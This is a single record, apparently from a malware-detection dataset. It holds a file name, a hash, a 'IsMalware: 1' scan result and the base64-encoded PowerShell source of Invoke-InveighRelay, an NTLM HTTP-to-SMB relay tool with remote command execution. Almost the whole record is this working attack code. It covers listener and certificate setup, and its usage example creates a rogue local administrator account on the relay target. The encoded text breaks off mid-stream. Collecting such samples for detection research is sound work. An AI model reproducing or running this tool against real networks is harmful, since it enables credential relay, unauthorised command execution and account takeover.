Invoke-InveighRelay.ps1,3bbf6c6c4c660cc3502612b5375d6977,Scan result is 32768. IsMalware: 1,ZnVuY3Rpb24gSW52b2tlLUludmVpZ2hSZWxheQp7CjwjCi5TWU5PUFNJUwpJbnZva2UtSW52ZWlnaFJlbGF5IHBlcmZvcm1zIE5UTE12MiBIVFRQIHRvIFNNQiByZWxheSB3aXRoIHBzZXhlYyBzdHlsZSBjb21tYW5kIGV4ZWN1dGlvbi4KCi5ERVNDUklQVElPTgpJbnZva2UtSW52ZWlnaFJlbGF5IGN1cnJlbnRseSBzdXBwb3J0cyBOVExNdjIgSFRUUCB0byBTTUIgcmVsYXkgd2l0aCBwc2V4ZWMgc3R5bGUgY29tbWFuZCBleGVjdXRpb24uCgogICAgSFRUUC9IVFRQUyB0byBTTUIgTlRMTXYyIHJlbGF5IHdpdGggZ3JhbnVsYXIgY29udHJvbAogICAgTlRMTXYxL05UTE12MiBjaGFsbGVuZ2UvcmVzcG9uc2UgY2FwdHVyZSBvdmVyIEhUVFAvSFRUUFMKICAgIEdyYW51bGFyIGNvbnRyb2wgb2YgY29uc29sZSBhbmQgZmlsZSBvdXRwdXQKICAgIENhbiBiZSBleGVjdXRlZCBhcyBlaXRoZXIgYSBzdGFuZGFsb25lIGZ1bmN0aW9uIG9yIHRocm91Z2ggSW52b2tlLUludmVpZ2gKCi5QQVJBTUVURVIgSFRUUApEZWZhdWx0ID0gRW5hYmxlZDogKFkvTikgRW5hYmxlL0Rpc2FibGUgSFRUUCBjaGFsbGVuZ2UvcmVzcG9uc2UgY2FwdHVyZS4KCi5QQVJBTUVURVIgSFRUUFMKRGVmYXVsdCA9IERpc2FibGVkOiAoWS9OKSBFbmFibGUvRGlzYWJsZSBIVFRQUyBjaGFsbGVuZ2UvcmVzcG9uc2UgY2FwdHVyZS4gV2FybmluZywgYSBjZXJ0IHdpbGwgYmUgaW5zdGFsbGVkIGluCnRoZSBsb2NhbCBzdG9yZSBhbmQgYXR0YWNoZWQgdG8gcG9ydCA0NDMuIElmIHRoZSBzY3JpcHQgZG9lcyBub3QgZXhpdCBncmFjZWZ1bGx5LCBleGVjdXRlCiJuZXRzaCBodHRwIGRlbGV0ZSBzc2xjZXJ0IGlwcG9ydD0wLjAuMC4wOjQ0MyIgYW5kIG1hbnVhbGx5IHJlbW92ZSB0aGUgY2VydGlmaWNhdGUgZnJvbSAiTG9jYWwgQ29tcHV0ZXJcUGVyc29uYWwiCmluIHRoZSBjZXJ0IHN0b3JlLgoKLlBBUkFNRVRFUiBIVFRQU0NlcnRBcHBJRApWYWxpZCBhcHBsaWNhdGlvbiBHVUlEIGZvciB1c2Ugd2l0aCB0aGUgY2VyaXRpY2F0ZS4KCi5QQVJBTUVURVIgSFRUUFNDZXJ0VGh1bWJwcmludApDZXJ0aWZpY2F0ZSB0aHVtYnByaW50IGZvciB1c2Ugd2l0aCBhIGN1c3RvbSBjZXJ0aWZpY2F0ZS4gVGhlIGNlcnRpZmljYXRlIGZpbGVuYW1lIG11c3QgYmUgbG9jYXRlZCBpbiB0aGUgY3VycmVudAp3b3JraW5nIGRpcmVjdG9yeSBhbmQgbmFtZWQgSW52ZWlnaC5wZnguCgouUEFSQU1FVEVSIENoYWxsZW5nZQpEZWZhdWx0ID0gUmFuZG9tOiAxNiBjaGFyYWN0ZXIgaGV4IE5UTE0gY2hhbGxlbmdlIGZvciB1c2Ugd2l0aCB0aGUgSFRUUCBsaXN0ZW5lci4gSWYgbGVmdCBibGFuaywgYSByYW5kb20KY2hhbGxlbmdlIHdpbGwgYmUgZ2VuZXJhdGVkIGZvciBlYWNoIHJlcXVlc3QuIE5vdGUgdGhhdCBkdXJpbmcgU01CIHJlbGF5IGF0dGVtcHRzLCB0aGUgY2hhbGxlbmdlIHdpbGwgYmUKcHVsbGVkIGZyb20gdGhlIFNNQiByZWxheSB0YXJnZXQuIAoKLlBBUkFNRVRFUiBNYWNoaW5lQWNjb3VudHMKRGVmYXVsdCA9IERpc2FibGVkOiAoWS9OKSBFbmFibGUvRGlzYWJsZSBzaG93aW5nIE5UTE0gY2hhbGxlbmdlL3Jlc3BvbnNlIGNhcHR1cmVzIGZyb20gbWFjaGluZSBhY2NvdW50cy4KCi5QQVJBTUVURVIgV1BBREF1dGgKRGVmYXVsdCA9IE5UTE06IChBbm9ueW1vdXMsTlRMTSkgSFRUUC9IVFRQUyBzZXJ2ZXIgYXV0aGVudGljYXRpb24gdHlwZSBmb3Igd3BhZC5kYXQgcmVxdWVzdHMuIFNldHRpbmcgdG8KQW5vbnltb3VzIGNhbiBwcmV2ZW50IGJyb3dzZXIgbG9naW4gcHJvbXB0cy4KCi5QQVJBTUVURVIgU01CUmVsYXlUYXJnZXQKSVAgYWRkcmVzcyBvZiBzeXN0ZW0gdG8gdGFyZ2V0IGZvciBTTUIgcmVsYXkuCgouUEFSQU1FVEVSIFNNQlJlbGF5Q29tbWFuZApDb21tYW5kIHRvIGV4ZWN1dGUgb24gU01CIHJlbGF5IHRhcmdldC4gVXNlIFBvd2VyU2hlbGwgY2hhcmFjdGVyIGVzY2FwZXMgd2hlcmUgbmVjZXNzYXJ5LgoKLlBBUkFNRVRFUiBTTUJSZWxheVVzZXJuYW1lcwpEZWZhdWx0ID0gQWxsIFVzZXJuYW1lczogQ29tbWEgc2VwYXJhdGVkIGxpc3Qgb2YgdXNlcm5hbWVzIHRvIHVzZSBmb3IgcmVsYXkgYXR0YWNrcy4gQWNjZXB0cyBib3RoIHVzZXJuYW1lIGFuZApkb21haW5cdXNlcm5hbWUgZm9ybWF0LiAKCi5QQVJBTUVURVIgU01CUmVsYXlBdXRvRGlzYWJsZQpEZWZhdWx0ID0gRW5hYmxlOiAoWS9OKSBFbmFibGUvRGlzYWJsZSBhdXRvbWF0aWNhbHkgZGlzYWJsaW5nIFNNQiByZWxheSBhZnRlciBhIHN1Y2Nlc3NmdWwgY29tbWFuZCBleGVjdXRpb24gb24KdGFyZ2V0LgoKLlBBUkFNRVRFUiBTTUJSZWxheU5ldHdvcmtUaW1lb3V0CkRlZmF1bHQgPSBObyBUaW1lb3V0OiAoSW50ZWdlcikgRHVyYXRpb24gaW4gc2Vjb25kcyB0aGF0IEludmVpZ2ggd2lsbCB3YWl0IGZvciBhIHJlcGx5IGZyb20gdGhlIFNNQiByZWxheSB0YXJnZXQKYWZ0ZXIgZWFjaCBwYWNrZXQgaXMgc2VudC4KCi5QQVJBTUVURVIgQ29uc29sZU91dHB1dApEZWZhdWx0ID0gRGlzYWJsZWQ6IChZL04pIEVuYWJsZS9EaXNhYmxlIHJlYWwgdGltZSBjb25zb2xlIG91dHB1dC4gSWYgdXNpbmcgdGhpcyBvcHRpb24gdGhyb3VnaCBhIHNoZWxsLCB0ZXN0IHRvCmVuc3VyZSB0aGF0IGl0IGRvZXNuJ3QgaGFuZyB0aGUgc2hlbGwuCgouUEFSQU1FVEVSIEZpbGVPdXRwdXQKRGVmYXVsdCA9IERpc2FibGVkOiAoWS9OKSBFbmFibGUvRGlzYWJsZSByZWFsIHRpbWUgZmlsZSBvdXRwdXQuCgouUEFSQU1FVEVSIFN0YXR1c091dHB1dApEZWZhdWx0ID0gRW5hYmxlZDogKFkvTikgRW5hYmxlL0Rpc2FibGUgc3RhcnR1cCBhbmQgc2h1dGRvd24gbWVzc2FnZXMuCgouUEFSQU1FVEVSIE91dHB1dFN0cmVhbU9ubHkKRGVmYXVsdCA9IERpc2FibGVkOiBFbmFibGUvRGlzYWJsZSBmb3JjaW5nIGFsbCBvdXRwdXQgdG8gdGhlIHN0YW5kYXJkIG91dHB1dCBzdHJlYW0uIFRoaXMgY2FuIGJlIGhlbHBmdWwgaWYKcnVubmluZyBJbnZlaWdoIFJlbGF5IHRocm91Z2ggYSBzaGVsbCB0aGF0IGRvZXMgbm90IHJldHVybiBvdGhlciBvdXRwdXQgc3RyZWFtcy4gTm90ZSB0aGF0IHlvdSB3aWxsIG5vdCBzZWUgdGhlCnZhcmlvdXMgeWVsbG93IHdhcm5pbmcgbWVzc2FnZXMgaWYgZW5hYmxlZC4KCi5QQVJBTUVURVIgT3V0cHV0RGlyCkRlZmF1bHQgPSBXb3JraW5nIERpcmVjdG9yeTogVmFsaWQgcGF0aCB0byBhbiBvdXRwdXQgZGlyZWN0b3J5IGZvciBsb2cgYW5kIGNhcHR1cmUgZmlsZXMuIEZpbGVPdXRwdXQgbXVzdCBhbHNvIGJlCmVuYWJsZWQuCgouUEFSQU1FVEVSIFJ1blRpbWUKKEludGVnZXIpIFJ1biB0aW1lIGR1cmF0aW9uIGluIG1pbnV0ZXMuCgouUEFSQU1FVEVSIFNob3dIZWxwCkRlZmF1bHQgPSBFbmFibGVkOiAoWS9OKSBFbmFibGUvRGlzYWJsZSB0aGUgaGVscCBtZXNzYWdlcyBhdCBzdGFydHVwLgoKLlBBUkFNRVRFUiBUb29sCkRlZmF1bHQgPSAwOiAoMCwxLDIpIEVuYWJsZS9EaXNhYmxlIGZlYXR1cmVzIGZvciBiZXR0ZXIgb3BlcmF0aW9uIHRocm91Z2ggZXh0ZXJuYWwgdG9vbHMgc3VjaCBhcyBNZXRlcnByZXRlcidzClBvd2VyU2hlbGwgZXh0ZW5zaW9uLCBNZXRhc3Bsb2l0J3MgSW50ZXJhY3RpdmUgUG93ZXJTaGVsbCBTZXNzaW9ucyBwYXlsb2FkcyBhbmQgRW1waXJlLgowID0gTm9uZSwgMSA9IE1ldGFzcGxvaXQvTWV0ZXJwcmV0ZXIsIDIgPSBFbXBpcmUgCgouRVhBTVBMRQpJbnZva2UtSW52ZWlnaCAtSFRUUCBOCkludm9rZS1JbnZlaWdoUmVsYXkgLVNNQlJlbGF5VGFyZ2V0IDE5Mi4xNjguMi41NSAtU01CUmVsYXlDb21tYW5kICJuZXQgdXNlciBEYXZlIFN1bW1lcjIwMTYgL2FkZCAmJiBuZXQgbG9jYWxncm91cCBhZG1pbmlzdHJhdG9ycyBEYXZlIC9hZGQiClBlcmZvcm0gU01CIHJlbGF5IHdpdGggYSBjb21tYW5kIHRoYXQgd2lsbCBjcmVhdGUgYSBsb2NhbCBhZG1pbmlzdHJhdG9yIGFjY291bnQgb24gdGhlIFNNQiByZWxheQp0YXJnZXQuCgouTElOSwpodHRwczovL2dpdGh1Yi5jb20vS2V2aW4tUm9iZXJ0c29uL0ludmVpZ2gKIz4KCiMgUGFyYW1ldGVyIGRlZmF1bHQgdmFsdWVzIGNhbiBiZSBtb2RpZmllZCBpbiB0aGlzIHNlY3Rpb246CltDbWRsZXRCaW5kaW5nKCldCnBhcmFtCiggCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNldCgiWSIsIk4iKV1bU3RyaW5nXSRIVFRQID0gIlkiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTZXQoIlkiLCJOIildW1N0cmluZ10kSFRUUFMgPSAiTiIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNldCgiWSIsIk4iKV1bU3RyaW5nXSRDb25zb2xlT3V0cHV0ID0gIk4iLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTZXQoIlkiLCJOIildW1N0cmluZ10kRmlsZU91dHB1dCA9ICJOIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1ZhbGlkYXRlU2V0KCJZIiwiTiIpXVtTdHJpbmddJFN0YXR1c091dHB1dCA9ICJZIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1ZhbGlkYXRlU2V0KCJZIiwiTiIpXVtTdHJpbmddJE91dHB1dFN0cmVhbU9ubHkgPSAiTiIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNldCgiWSIsIk4iKV1bU3RyaW5nXSRNYWNoaW5lQWNjb3VudHMgPSAiTiIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNldCgiWSIsIk4iKV1bU3RyaW5nXSRTaG93SGVscCA9ICJZIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1ZhbGlkYXRlU2V0KCJZIiwiTiIpXVtTdHJpbmddJFNNQlJlbGF5QXV0b0Rpc2FibGUgPSAiWSIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNldCgiQW5vbnltb3VzIiwiTlRMTSIpXVtTdHJpbmddJFdQQURBdXRoID0gIk5UTE0iLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTZXQoIjAiLCIxIiwiMiIpXVtTdHJpbmddJFRvb2wgPSAiMCIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNjcmlwdCh7VGVzdC1QYXRoICRffSldW1N0cmluZ10kT3V0cHV0RGlyID0gIiIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSldW1ZhbGlkYXRlU2NyaXB0KHskXyAtbWF0Y2ggW1N5c3RlbS5OZXQuSVBBZGRyZXNzXSRffSldW1N0cmluZ10kU01CUmVsYXlUYXJnZXQgPSAiIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1ZhbGlkYXRlUGF0dGVybignXltBLUZhLWYwLTldezE2fSQnKV1bU3RyaW5nXSRDaGFsbGVuZ2UgPSAiIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW0FycmF5XSRTTUJSZWxheVVzZXJuYW1lcyA9ICIiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bSW50XSRTTUJSZWxheU5ldHdvcmtUaW1lb3V0ID0gIiIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtJbnRdJFJ1blRpbWUgPSAiIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlKV1bU3RyaW5nXSRTTUJSZWxheUNvbW1hbmQgPSAiIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1N0cmluZ10kSFRUUFNDZXJ0QXBwSUQgPSAiMDAxMTIyMzMtNDQ1NS02Njc3LTg4OTktQUFCQkNDRERFRUZGIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1N0cmluZ10kSFRUUFNDZXJ0VGh1bWJwcmludCA9ICI5OGMxZDU0ODQwYzVjMTJjZWQ3MTA3NThiNmVlNTZjYzYyZmExZjBkIiwKICAgIFtwYXJhbWV0ZXIoVmFsdWVGcm9tUmVtYWluaW5nQXJndW1lbnRzPSR0cnVlKV0kaW52YWxpZF9wYXJhbWV0ZXIKKQoKaWYgKCRpbnZhbGlkX3BhcmFtZXRlcikKewogICAgdGhyb3cgIiQoJGludmFsaWRfcGFyYW1ldGVyKSBpcyBub3QgYSB2YWxpZCBwYXJhbWV0ZXIuIgp9CgppZigkaW52ZWlnaC5IVFRQIC1vciAkaW52ZWlnaC5IVFRQUykKewogICAgdGhyb3cgIllvdSBtdXN0IHN0b3Agc3RvcCBvdGhlciBJbnZlaWdoIEhUVFAvSFRUUFMgbGlzdGVuZXJzIGJlZm9yZSBydW5uaW5nIHRoaXMgbW9kdWxlLiIKfQoKaWYoISRTTUJSZWxheVRhcmdldCkKewogICAgdGhyb3cgIllvdSBtdXN0IHNwZWNpZnkgYW4gLVNNQlJlbGF5VGFyZ2V0IGlmIGVuYWJsaW5nIC1TTUJSZWxheSIKfQoKaWYoISRTTUJSZWxheUNvbW1hbmQpCnsKICAgIHRocm93ICJZb3UgbXVzdCBzcGVjaWZ5IGFuIC1TTUJSZWxheUNvbW1hbmQgaWYgZW5hYmxpbmcgLVNNQlJlbGF5Igp9CgppZighJE91dHB1dERpcikKeyAKICAgICRvdXRwdXRfZGlyZWN0b3J5ID0gJFBXRC5QYXRoCn0KZWxzZQp7CiAgICAkb3V0cHV0X2RpcmVjdG9yeSA9ICRPdXRwdXREaXIKfQoKaWYoISRpbnZlaWdoKQp7CiAgICAkZ2xvYmFsOmludmVpZ2ggPSBbSGFzaFRhYmxlXTo6U3luY2hyb25pemVkKEB7fSkKICAgICRpbnZlaWdoLmxvZyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAogICAgJGludmVpZ2guTlRMTXYxX2xpc3QgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKICAgICRpbnZlaWdoLk5UTE12MV91c2VybmFtZV9saXN0ID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0CiAgICAkaW52ZWlnaC5OVExNdjJfbGlzdCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAogICAgJGludmVpZ2guTlRMTXYyX3VzZXJuYW1lX2xpc3QgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKICAgICRpbnZlaWdoLmNsZWFydGV4dF9saXN0ID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0CiAgICAkaW52ZWlnaC5JUF9jYXB0dXJlX2xpc3QgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKICAgICRpbnZlaWdoLlNNQlJlbGF5X2ZhaWxlZF9saXN0ID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0CiAgICAkaW52ZWlnaC52YWxpZF9ob3N0X2xpc3QgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKfQoKaWYoJGludmVpZ2guSFRUUF9saXN0ZW5lci5Jc0xpc3RlbmluZyAtYW5kICEkaW52ZWlnaC5ydW5uaW5nKQp7CiAgICAkaW52ZWlnaC5IVFRQX2xpc3RlbmVyLlN0b3AoKQogICAgJGludmVpZ2guSFRUUF9saXN0ZW5lci5DbG9zZSgpCn0KCmlmKCEkaW52ZWlnaC5ydW5uaW5nIC1vciAhJGludmVpZ2gudW5wcml2aWxlZ2VkX3J1bm5pbmcpCnsKICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZSA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAogICAgJGludmVpZ2gubG9nX2ZpbGVfcXVldWUgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKICAgICRpbnZlaWdoLk5UTE12MV9maWxlX3F1ZXVlID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0CiAgICAkaW52ZWlnaC5OVExNdjJfZmlsZV9xdWV1ZSA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAogICAgJGludmVpZ2guY2xlYXJ0ZXh0X2ZpbGVfcXVldWUgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKICAgICRpbnZlaWdoLkhUVFBfY2hhbGxlbmdlX3F1ZXVlID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0CiAgICAkaW52ZWlnaC5jZXJ0aWZpY2F0ZV9hcHBsaWNhdGlvbl9JRCA9ICRIVFRQU0NlcnRBcHBJRAogICAgJGludmVpZ2guY2VydGlmaWNhdGVfdGh1bWJwcmludCA9ICRIVFRQU0NlcnRUaHVtYnByaW50CiAgICAkaW52ZWlnaC5jb25zb2xlX291dHB1dCA9ICRmYWxzZQogICAgJGludmVpZ2guY29uc29sZV9pbnB1dCA9ICR0cnVlCiAgICAkaW52ZWlnaC5maWxlX291dHB1dCA9ICRmYWxzZQogICAgJGludmVpZ2gubG9nX291dF9maWxlID0gJG91dHB1dF9kaXJlY3RvcnkgKyAiXEludmVpZ2gtTG9nLnR4dCIKICAgICRpbnZlaWdoLk5UTE12MV9vdXRfZmlsZSA9ICRvdXRwdXRfZGlyZWN0b3J5ICsgIlxJbnZlaWdoLU5UTE12MS50eHQiCiAgICAkaW52ZWlnaC5OVExNdjJfb3V0X2ZpbGUgPSAkb3V0cHV0X2RpcmVjdG9yeSArICJcSW52ZWlnaC1OVExNdjIudHh0IgogICAgJGludmVpZ2guY2xlYXJ0ZXh0X291dF9maWxlID0gJG91dHB1dF9kaXJlY3RvcnkgKyAiXEludmVpZ2gtQ2xlYXJ0ZXh0LnR4dCIKfQoKJGludmVpZ2gucmVsYXlfcnVubmluZyA9ICR0cnVlCiRpbnZlaWdoLlNNQl9yZWxheV9hY3RpdmVfc3RlcCA9IDAKJGludmVpZ2guU01CX3JlbGF5ID0gJHRydWUKCmlmKCRTdGF0dXNPdXRwdXQgLWVxICdZJykKewogICAgJGludmVpZ2guc3RhdHVzX291dHB1dCA9ICR0cnVlCn0KZWxzZQp7CiAgICAkaW52ZWlnaC5zdGF0dXNfb3V0cHV0ID0gJGZhbHNlCn0KCmlmKCRPdXRwdXRTdHJlYW1Pbmx5IC1lcSAnWScpCnsKICAgICRpbnZlaWdoLm91dHB1dF9zdHJlYW1fb25seSA9ICR0cnVlCn0KZWxzZQp7CiAgICAkaW52ZWlnaC5vdXRwdXRfc3RyZWFtX29ubHkgPSAkZmFsc2UKfQoKaWYoJFRvb2wgLWVxIDEpICMgTWV0YXNwbG9pdCBJbnRlcmFjdGl2ZSBQb3dlclNoZWxsIFBheWxvYWRzIGFuZCBNZXRlcnByZXRlcidzIFBvd2VyU2hlbGwgRXh0ZW5zaW9uCnsKICAgICRpbnZlaWdoLnRvb2wgPSAxCiAgICAkaW52ZWlnaC5vdXRwdXRfc3RyZWFtX29ubHkgPSAkdHJ1ZQogICAgJGludmVpZ2gubmV3bGluZSA9ICIiCiAgICAkQ29uc29sZU91dHB1dCA9ICJOIgp9CmVsc2VpZigkVG9vbCAtZXEgMikgIyBQb3dlclNoZWxsIEVtcGlyZQp7CiAgICAkaW52ZWlnaC50b29sID0gMgogICAgJGludmVpZ2gub3V0cHV0X3N0cmVhbV9vbmx5ID0gJHRydWUKICAgICRpbnZlaWdoLmNvbnNvbGVfaW5wdXQgPSAkZmFsc2UKICAgICRpbnZlaWdoLm5ld2xpbmUgPSAiYG4iCiAgICAkQ29uc29sZU91dHB1dCA9ICJZIgogICAgJFNob3dIZWxwID0gIk4iCn0KZWxzZQp7CiAgICAkaW52ZWlnaC50b29sID0gMAogICAgJGludmVpZ2gubmV3bGluZSA9ICIiCn0KCiMgV3JpdGUgc3RhcnR1cCBtZXNzYWdlcwokaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJJbnZlaWdoIFJlbGF5IHN0YXJ0ZWQgYXQgJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykiKSA+ICRudWxsCiRpbnZlaWdoLmxvZy5BZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIEludmVpZ2ggUmVsYXkgc3RhcnRlZCIpXSkgPiAkbnVsbAoKJGZpcmV3YWxsX3N0YXR1cyA9IG5ldHNoIGFkdmZpcmV3YWxsIHNob3cgYWxscHJvZmlsZXMgc3RhdGUgfCBXaGVyZS1PYmplY3QgeyRfIC1tYXRjaCAnT04nfQoKaWYoJGZpcmV3YWxsX3N0YXR1cykKewogICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiV2luZG93cyBGaXJld2FsbCA9IEVuYWJsZWQiKSAgPiAkbnVsbAoKICAgICRmaXJld2FsbF9ydWxlcyA9IE5ldy1PYmplY3QgLWNvbU9iamVjdCBITmV0Q2ZnLkZ3UG9saWN5MgogICAgJGZpcmV3YWxsX3Bvd2Vyc2hlbGwgPSAkZmlyZXdhbGxfcnVsZXMucnVsZXMgfCBXaGVyZS1PYmplY3QgeyRfLkVuYWJsZWQgLWVxICR0cnVlIC1hbmQgJF8uRGlyZWN0aW9uIC1lcSAxfSB8U2VsZWN0LU9iamVjdCAtUHJvcGVydHkgTmFtZSB8IFNlbGVjdC1TdHJpbmcgIldpbmRvd3MgUG93ZXJTaGVsbH0iCgogICAgaWYoJGZpcmV3YWxsX3Bvd2Vyc2hlbGwpCiAgICB7CiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiV2luZG93cyBGaXJld2FsbCAtIFBvd2VyU2hlbGwuZXhlID0gQWxsb3dlZCIpICA+ICRudWxsCiAgICB9Cn0KCmlmKCRIVFRQIC1lcSAnWScpCnsKCiAgICAkSFRUUF9wb3J0X2NoZWNrID0gbmV0c3RhdCAtYW5wIFRDUCB8IGZpbmRzdHIgMC4wLjAuMDo4MAoKICAgIGlmKCRIVFRQX3BvcnRfY2hlY2spCiAgICB7CiAgICAgICAgJGludmVpZ2guSFRUUCA9ICRmYWxzZQogICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIkhUVFAgQ2FwdHVyZS9SZWxheSBEaXNhYmxlZCBEdWUgVG8gSW4gVXNlIFBvcnQgODAiKSAgPiAkbnVsbAogICAgfQogICAgZWxzZQogICAgewogICAgICAgICRpbnZlaWdoLkhUVFAgPSAkdHJ1ZQogICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIkhUVFAgQ2FwdHVyZS9SZWxheSA9IEVuYWJsZWQiKSAgPiAkbnVsbAogICAgfQoKfQplbHNlCnsKICAgICRpbnZlaWdoLkhUVFAgPSAkZmFsc2UKICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIkhUVFAgQ2FwdHVyZS9SZWxheSA9IERpc2FibGVkIikgID4gJG51bGwKfQoKaWYoJEhUVFBTIC1lcSAnWScpCnsKICAgIAogICAgJEhUVFBTX3BvcnRfY2hlY2sgPSBuZXRzdGF0IC1hbnAgVENQIHwgZmluZHN0ciAwLjAuMC4wOjQ0MwoKICAgIGlmKCRIVFRQU19wb3J0X2NoZWNrKQogICAgewogICAgICAgICRpbnZlaWdoLkhUVFAgPSAkdHJ1ZQogICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIkhUVFBTIENhcHR1cmUvUmVsYXkgRGlzYWJsZWQgRHVlIFRvIEluIFVzZSBQb3J0IDQ0MyIpICA+ICRudWxsCiAgICB9CiAgICBlbHNlCiAgICB7CgogICAgICAgIHRyeQogICAgICAgIHsKICAgICAgICAgICAgJGludmVpZ2guSFRUUFMgPSAkdHJ1ZQogICAgICAgICAgICAkY2VydGlmaWNhdGVfc3RvcmUgPSBOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuWDUwOUNlcnRpZmljYXRlcy5YNTA5U3RvcmUoIk15IiwiTG9jYWxNYWNoaW5lIikKICAgICAgICAgICAgJGNlcnRpZmljYXRlX3N0b3JlLk9wZW4oJ1JlYWRXcml0ZScpCiAgICAgICAgICAgICRjZXJ0aWZpY2F0ZSA9IE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5YNTA5Q2VydGlmaWNhdGVzLlg1MDlDZXJ0aWZpY2F0ZTIKICAgICAgICAgICAgJGNlcnRpZmljYXRlLkltcG9ydCgkUFdELlBhdGggKyAiXEludmVpZ2gucGZ4IikKICAgICAgICAgICAgJGNlcnRpZmljYXRlX3N0b3JlLkFkZCgkY2VydGlmaWNhdGUpIAogICAgICAgICAgICAkY2VydGlmaWNhdGVfc3RvcmUuQ2xvc2UoKQogICAgICAgICAgICAkbmV0c2hfY2VydGhhc2ggPSAiY2VydGhhc2g9IiArICRpbnZlaWdoLmNlcnRpZmljYXRlX3RodW1icHJpbnQKICAgICAgICAgICAgJG5ldHNoX2FwcF9JRCA9ICJhcHBpZD17IiArICRpbnZlaWdoLmNlcnRpZmljYXRlX2FwcGxpY2F0aW9uX0lEICsgIn0iCiAgICAgICAgICAgICRuZXRzaF9hcmd1bWVudHMgPSBAKCJodHRwIiwiYWRkIiwic3NsY2VydCIsImlwcG9ydD0wLjAuMC4wOjQ0MyIsJG5ldHNoX2NlcnRoYXNoLCRuZXRzaF9hcHBfSUQpCiAgICAgICAgICAgICYgIm5ldHNoIiAkbmV0c2hfYXJndW1lbnRzID4gJG51bGwKICAgICAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiSFRUUFMgQ2FwdHVyZS9SZWxheSA9IEVuYWJsZWQiKSAgPiAkbnVsbAogICAgICAgIH0KICAgICAgICBjYXRjaAogICAgICAgIHsKICAgICAgICAgICAgJGNlcnRpZmljYXRlX3N0b3JlLkNsb3NlKCkKICAgICAgICAgICAgJEhUVFBTPSJOIgogICAgICAgICAgICAkaW52ZWlnaC5IVFRQUyA9ICRmYWxzZQogICAgICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJIVFRQUyBDYXB0dXJlL1JlbGF5IERpc2Fi